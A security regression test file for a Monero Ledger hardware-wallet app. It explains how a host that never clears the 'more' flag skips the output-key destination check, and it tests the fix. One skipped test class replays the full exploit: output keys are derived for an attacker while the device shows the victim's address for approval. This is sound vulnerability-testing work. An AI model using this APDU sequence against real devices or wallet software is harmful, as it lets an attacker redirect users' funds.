"""
The OUTK destination check only runs on the last output, and the host picks which
output is last.

INS_GEN_TXOUT_KEYS derives the one-time output keys and chains the destination it
derived them for into sha256_outkeys. The review the user reads comes from a
different APDU, INS_VALIDATE/P1=2, carrying its own (Aout, Bout). One comparison ties
the two together, and it sits inside the MORE-clear branch:

    if ((options & IN_OPTION_MORE_COMMAND) == 0) {        // src/monero_prehash.c:251
        monero_sha256_outkeys_final(k);
        if (memcmp(k, G_monero_vstate.OUTK, KEY_SIZE) != 0)
            err = SW_SECURITY_COMMITMENT_CHAIN_CONTROL;   // 0x6914
    }

IN_OPTION_MORE_COMMAND is host-controlled, so a host that never clears it never
reaches the check -- and the state machine takes INS_VALIDATE/P1=3 next regardless.
That branch is also the only place the commitment digest G.C is captured, and
monero_reset_tx() doesn't clear G.C either.

On BAGL approval doesn't depend on that boundary: every non-change output gets its own
blocking review via ux_flow_validation, whose callback sets user_approved_tx = 1 for a
non-terminal output just as much as for the last (src/monero_ux_nano.c:230-243). So
derive the keys for the ATTACKER's (Aout, Bout), stream a prefix carrying those
device-derived keys so the output-key binding passes, send the VICTIM's (Aout, Bout)
at P1=2 with MORE set, and finalize -- nothing ever notices the address on screen
isn't the one the keys were derived for. On NBGL this dies, because user_approved_tx
comes only from start_signature() (see TestNbglReviewEnforced in
tests/test_vuln_nbgl_review_skip.py), so these tests skip on Stax/Flex.

The fix is a per-transaction outputs_reviewed flag, set only in that MORE-clear
branch after the OUTK compare and the C capture, and required by the terminal
INS_VALIDATE/P1=3. The OUTK comparison itself is NOT behind
#ifndef BYPASS_COMMITMENT_FOR_TESTS, so every assertion below holds on a DEBUG=1
build.

The two classes below pin the mismatching rows of the truth table:

  destination differs   MORE clear   ->  0x6914, the OUTK compare fires
  destination differs   MORE set     ->  0x6920, the boundary never ran

The accepted row -- matching destination, MORE clear, prehash returned -- is the
honest path already covered by test_sig_real_* on nanosp, so it is not repeated
here.

Not covered: that a stale C satisfies the terminal commitment check. That one
(src/monero_prehash.c:353) IS behind BYPASS_COMMITMENT_FOR_TESTS, so on this build it
passes unconditionally and priming C would be unverifiable.

test_vuln_outkey_substitution.py swaps a key inside the prefix and shows the binding
catches it; this file leaves the prefix honest and attacks the review side instead.

Run: pytest tests/test_vuln_outk_compare_skippable.py -v --device nanosp   (DEBUG=1
build, BAGL only).

Snapshot dirs are named after the bare test function, so method names must stay
unique across the whole suite. Once fixed, skip the second class and assert a per-tx
`outputs_reviewed` flag -- set only in the MORE-clear branch after the OUTK compare --
is required by the terminal finalize, plus a BAGL non-terminal callback that returns
SW_OK without setting user_approved_tx.
"""

import struct

import pytest
import nacl.bindings as nb
from Crypto.Hash import keccak

from ragger.backend.interface import BackendInterface
from ragger.error import ExceptionRAPDU
from ragger.navigator import Navigator

from monero_client.monero_types import SigType, Keys, Type, InsType
from monero_client.monero_cmd import MoneroCmd, PROTOCOL_VERSION
from monero_client.monero_crypto_cmd import MoneroCryptoCmd
from monero_client.crypto.hmac import hmac_sha256
from monero_client.utils.tx_prefix import build_tx_prefix_outkeys
from monero_client.utils.varint import encode_varint

L = 2 ** 252 + 27742317777372353535851937790883648493

# Raised by the OUTK destination-chain comparison. Not affected by DEBUG=1.
SW_SECURITY_COMMITMENT_CHAIN_CONTROL = 0x6914
# Raised once the output boundary that compares OUTK and captures C never ran.
SW_SECURITY_OUTPUTS_NOT_REVIEWED = 0x6920
SW_SECURITY_USER_NOT_APPROVED = 0x691D

ZERO_COMMITMENT = bytes(32)
ATTACKER_PROOF = b"\xad" * 32
AMOUNT = 907880000  # 0.00090788 XMR
FEE = 30660000      # 0.00003066 XMR


def _sc_reduce32(b: bytes) -> bytes:
    return (int.from_bytes(b, "little") % L).to_bytes(32, "little")


# The attacker's wallet: two valid Ed25519 points, distinct from the device's.
_ATTACKER = Keys(
    public_view_key=nb.crypto_scalarmult_ed25519_base_noclamp(_sc_reduce32(bytes([0x21] * 32))),
    public_spend_key=nb.crypto_scalarmult_ed25519_base_noclamp(_sc_reduce32(bytes([0x22] * 32))),
    secret_view_key=None, secret_spend_key=None, addr="",
)


def _raw_apdu(ins: InsType, p1: int, p2: int, option: int, payload: bytes = b"") -> bytes:
    """Full APDU in the app's framing (option is the first data byte)."""
    return struct.pack("BBBBBB", PROTOCOL_VERSION, ins.value, p1, p2,
                       1 + len(payload), option) + payload


def _output_payload(recv: Keys, ak: bytes, blinded_mask: bytes,
                    blinded_amount: bytes) -> bytes:
    """An INS_VALIDATE/P1=2 record for a non-change destination."""
    return b"".join((
        b"\x00", b"\x00",
        recv.public_view_key, recv.public_spend_key, ak,
        hmac_sha256(ak, MoneroCryptoCmd.HMAC_KEY, Type.AMOUNT_KEY),
        ZERO_COMMITMENT, blinded_mask, blinded_amount,
    ))


def _setup_mismatched_tx(monero: MoneroCmd, device, test_name: str, state):
    """REAL tx up to (not including) INS_VALIDATE/P1=2, output keys derived for the
    ATTACKER while the review will show the VICTIM.

    One non-change output on purpose: it is the destination flow that draws a
    review here."""
    monero.reset_and_get_version(monero_client_version=b"0.18")
    view, spend, addr = monero.get_public_keys()
    state["victim"] = Keys(public_view_key=view, public_spend_key=spend,
                           secret_view_key=None, secret_spend_key=None, addr=addr)

    assert monero.set_signature_mode(sig_type=SigType.REAL) == SigType.REAL
    tx_pub_key, tx_priv_key, _, _ = monero.open_tx()

    # Derived for the ATTACKER -- these land on chain.
    ak, eph, _ = monero.gen_txout_keys(
        _tx_priv_key=tx_priv_key, tx_pub_key=tx_pub_key,
        dst_pub_view_key=_ATTACKER.public_view_key,
        dst_pub_spend_key=_ATTACKER.public_spend_key,
        output_index=0, is_change_addr=False, is_subaddress=False)
    state["ak"] = ak

    # Honest prefix with that device-derived key, so the output-key binding passes.
    prefix = build_tx_prefix_outkeys(vout_keys=[eph], tx_pubkey=tx_pub_key)
    monero.prefix_hash_init(test_name, device, navigator=None, version=0, timelock=0)
    state["prefixh"] = monero.prefix_hash_update(index=1, payload=prefix, is_last=True)

    mask = monero.gen_commitment_mask(ak)
    state["blinded_mask"], state["blinded_amount"] = monero.blind(
        _ak_amount=ak, mask=mask, amount=AMOUNT, is_short=True)



@pytest.mark.incremental
class TestOutkCompareFiresOnTerminalOutput:
    """Control row: with MORE clear, a P1=2 destination that doesn't match what
    INS_GEN_TXOUT_KEYS derived for is rejected 0x6914. The rejection happens at
    monero_prehash.c:258, before any review is drawn, so no navigation is needed.

    The refusal exits the app, so it is the last step in this class."""

    @staticmethod
    @pytest.fixture(autouse=True, scope="class")
    def bagl_only(device):
        if not device.is_nano:
            pytest.skip("BAGL/Nano only; on NBGL see TestNbglReviewEnforced")

    @staticmethod
    @pytest.fixture(autouse=True, scope="class")
    def state():
        return {}

    @staticmethod
    def test_control_setup(monero: MoneroCmd, device, test_name: str, state):
        _setup_mismatched_tx(monero, device, test_name, state)

    @staticmethod
    def test_control_terminal_output_rejects_mismatch(monero: MoneroCmd,
                                                      backend: BackendInterface,
                                                      navigator: Navigator,
                                                      device, test_name: str, state):
        # Fee first -- blocking review on BAGL.
        monero.validate_prehash_init(test_name, device, navigator, 1, 0, FEE)

        # MORE clear (0x02 = short amount, no 0x80) + the victim's keys: the OUTK
        # compare runs and must reject.
        apdu = _raw_apdu(InsType.INS_VALIDATE, 2, 1, 0x02,
                         _output_payload(state["victim"], state["ak"],
                                         state["blinded_mask"], state["blinded_amount"]))
        with pytest.raises(ExceptionRAPDU) as exc:
            backend.exchange_raw(apdu)
        assert exc.value.status == SW_SECURITY_COMMITMENT_CHAIN_CONTROL, (
            f"expected 0x6914 for a destination that does not match the derived keys, "
            f"got {exc.value.status:#06x}")


@pytest.mark.skip(reason="Demonstrates the (now-fixed) skippable OUTK compare; passes "
                         "only on a build without the outputs_reviewed gate. Use "
                         "--run-skipped to re-confirm the exploit.")
@pytest.mark.incremental
class TestOutkCompareSkippedWhenMoreStaysSet:
    """The same mismatch was accepted when MORE stayed set: the user approved an
    address the output keys were never derived for, and the device produced the
    pre-MLSAG signing hash."""

    @staticmethod
    @pytest.fixture(autouse=True, scope="class")
    def bagl_only(device):
        if not device.is_nano:
            pytest.skip("BAGL/Nano only; on NBGL see TestNbglReviewEnforced")

    @staticmethod
    @pytest.fixture(autouse=True, scope="class")
    def state():
        return {}

    @staticmethod
    def test_skip_setup(monero: MoneroCmd, device, test_name: str, state):
        _setup_mismatched_tx(monero, device, test_name, state)

    @staticmethod
    def test_skip_user_approves_wrong_address(monero: MoneroCmd,
                                              backend: BackendInterface,
                                              navigator: Navigator,
                                              device, test_name: str, state):
        """MORE stays set, so no OUTK compare -- but BAGL still draws a blocking
        Amount/Destination review whose confirm callback sets user_approved_tx. The
        address shown is the victim's; the keys on chain are the attacker's."""
        monero.validate_prehash_init(test_name, device, navigator, 1, 0, FEE)
        monero.validate_prehash_update(
            backend, test_name, navigator, index=1, is_short=True,
            is_change_addr=False, is_subaddress=False,
            dst_pub_view_key=state["victim"].public_view_key,
            dst_pub_spend_key=state["victim"].public_spend_key,
            _ak_amount=state["ak"], commitment=ZERO_COMMITMENT,
            blinded_amount=state["blinded_amount"],
            blinded_mask=state["blinded_mask"],
            is_last=False)  # <-- IN_OPTION_MORE_COMMAND stays set

    @staticmethod
    def test_skip_terminal_finalize_succeeds(backend: BackendInterface, state):
        data = backend.exchange_raw(
            _raw_apdu(InsType.INS_VALIDATE, 3, 1, 0x00,
                      state["prefixh"] + ATTACKER_PROOF)).data
        assert len(data) == 32
        state["mlsagh"] = data

    @staticmethod
    def test_skip_close(monero: MoneroCmd):
        monero.close_tx()


@pytest.mark.incremental
class TestOutputsReviewedEnforced:
    """Fix verification: the same attack must now be refused at the terminal step.

    outputs_reviewed is set only in the MORE-clear branch of INS_VALIDATE/P1=2, so a
    host that never clears MORE cannot finalize.

    The refusal is 0x691D, not 0x6920: BAGL approval is now terminal-only too, so
    skipping the boundary also skips approval, and monero_tx_stages_check reports
    the first missing stage. Both gates are missing here and only one code can come
    back -- the outputs gate is no longer separately observable from outside, on
    either UI. It stays as defense in depth.

    Last class in the file: the refusal exits the app."""

    @staticmethod
    @pytest.fixture(autouse=True, scope="class")
    def bagl_only(device):
        if not device.is_nano:
            pytest.skip("BAGL/Nano only; on NBGL see TestNbglReviewEnforced")

    @staticmethod
    @pytest.fixture(autouse=True, scope="class")
    def state():
        return {}

    @staticmethod
    def test_outk_enforced_setup(monero: MoneroCmd, device, test_name: str, state):
        _setup_mismatched_tx(monero, device, test_name, state)

    @staticmethod
    def test_outk_enforced_more_stays_set(monero: MoneroCmd, backend: BackendInterface,
                                     navigator: Navigator, device, test_name: str,
                                     state):
        """The non-terminal output is still accepted and still reviewed; only the
        finalize below must refuse."""
        monero.validate_prehash_init(test_name, device, navigator, 1, 0, FEE)
        monero.validate_prehash_update(
            backend, test_name, navigator, index=1, is_short=True,
            is_change_addr=False, is_subaddress=False,
            dst_pub_view_key=state["victim"].public_view_key,
            dst_pub_spend_key=state["victim"].public_spend_key,
            _ak_amount=state["ak"], commitment=ZERO_COMMITMENT,
            blinded_amount=state["blinded_amount"],
            blinded_mask=state["blinded_mask"],
            is_last=False)

    @staticmethod
    def test_outk_enforced_finalize_refused(backend: BackendInterface, state):
        with pytest.raises(ExceptionRAPDU) as exc:
            backend.exchange_raw(
                _raw_apdu(InsType.INS_VALIDATE, 3, 1, 0x00,
                          state["prefixh"] + ATTACKER_PROOF))
        assert exc.value.status == SW_SECURITY_USER_NOT_APPROVED, (
            f"expected {SW_SECURITY_USER_NOT_APPROVED:#06x} when the output "
            f"boundary never ran, got {exc.value.status:#06x}")
